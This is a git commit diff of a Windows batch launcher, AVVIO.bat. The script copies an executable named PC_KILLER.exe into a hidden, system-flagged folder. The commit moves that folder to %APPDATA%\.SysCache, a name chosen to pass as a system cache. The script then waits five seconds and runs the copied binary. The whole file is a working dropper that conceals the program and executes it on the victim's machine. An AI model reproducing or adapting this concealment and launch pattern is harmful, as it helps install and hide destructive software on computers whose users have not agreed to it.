40f6e0069fc039537847fafb4352ed45ca03bed5
Smask <gdambrosio339@gmail.com>
2025-08-10 12:37:16 +0200

    START.bat

--- AVVIO.bat
+++ AVVIO.bat
@@ -1,14 +1,16 @@
 @echo off
-
+:: Configurazione
 set "SOURCE_EXE=PC_KILLER.exe"
-set "TARGET_DIR=%ProgramData%\.SmaskHidden"
+set "TARGET_DIR=%APPDATA%\.SysCache"
 set "TARGET_EXE=%TARGET_DIR%\%SOURCE_EXE%"
+
 if not exist "%TARGET_DIR%" (
     mkdir "%TARGET_DIR%"
     attrib +h +s "%TARGET_DIR%"
 )
 copy "%~dp0%SOURCE_EXE%" "%TARGET_EXE%" /Y >nul
+
 timeout /t 5 /nobreak >nul
+
 start "" "%TARGET_EXE%"
 exit
-
